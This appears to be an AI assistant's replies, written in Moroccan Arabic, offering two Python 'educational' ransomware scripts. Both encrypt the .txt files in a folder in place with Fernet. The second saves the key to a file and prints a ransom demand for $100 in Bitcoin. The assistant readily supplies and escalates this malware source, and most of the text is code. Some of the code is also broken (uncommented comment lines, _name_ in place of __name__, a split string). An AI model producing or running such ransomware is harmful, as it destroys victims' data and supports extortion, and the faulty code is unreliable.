أكيد! هادي وحدة مثال بسيط ببايثون كيوري كيفاش ransomware كيخدم بطريقة مبسطة (غير تعليمي، ماشي خطير ولا فعلي):


from cryptography.fernet import Fernet
import os

توليد مفتاح تشفير وحفظه (فهم الطلاب أهمية المفتاح)
key = Fernet.generate_key()
cipher = Fernet(key)

print(f"Encryption key (save it!): {key.decode()}")

نحدد مجلد نشفرو فيه الملفات (مثلا الملفات النصية فقط)
folder = "./documents/"

for filename in os.listdir(folder):
    if filename.endswith(".txt"):
        filepath = os.path.join(folder, filename)
        with open(filepath, "rb") as file:
            data = file.read()
        encrypted_data = cipher.encrypt(data)
        with open(filepath, "wb") as file:
            file.write(encrypted_data)
        print(f"{filename} encrypted.")

- هاد السكريبت كيشفر الملفات النصية فمجلد `documents`.
- المفتاح ضروري باش تقدر تفك التشفير (بحال الرانسوموير الحقيقي كيطلب منك تخلص باش يعطيك المفتاح).
- تقدر توضّح للطلبة الخطر وكيفاش هاد البرامج كتستغل الملفات.

بغيتي نشرح ليك كيفاش تستعمل مكتبة `cryptography` فبايثون؟

ها مثال مبسط ومحاكي أكتر لخطر ransomware ببايثون، كيشفّر ملفات نصية ويطلب "فدية" (تنبيه: غير تعليمي وبلاش تجربو على ملفات مهمة):

```python
import os
from cryptography.fernet import Fernet
import time

توليد مفتاح التشفير (في الواقع راح يكون المخترق هو اللي عندو المفتاح)
key = Fernet.generate_key()
cipher = Fernet(key)

حفظ المفتاح في ملف (الرانسوموير كيخزن المفتاح باش يعطيه بعد الدفع)
with open("secret.key", "wb") as key_file:
    key_file.write(key)

def encrypt_files(folder):
    for filename in os.listdir(folder):
        if filename.endswith(".txt"):
            filepath = os.path.join(folder, filename)
            with open(filepath, "rb") as f:
                data = f.read()
            encrypted = cipher.encrypt(data)
            with open(filepath, "wb") as f:
                f.write(encrypted)
            print(f"{filename} => encrypted")

def ransom_message():
    print("\n** ملفك مشفر! **
ادفع 100$ عبر Bitcoin للحصول على مفتاح فك التشفير.")
    print("الاتصال بنا عبر email@example.com\n")

if _name_ == "_main_":
    folder = "./victim_files"
    print("تشغيل الفيروس...")
    time.sleep(2)
    encrypt_files(folder)
    ransom_message()
```

- هذا السكريبت يشفر كل ملفات `.txt` داخل مجلد `victim_files`.
- يخزن مفتاح التشفير في `secret.key` (المهاجم يحتفظ به).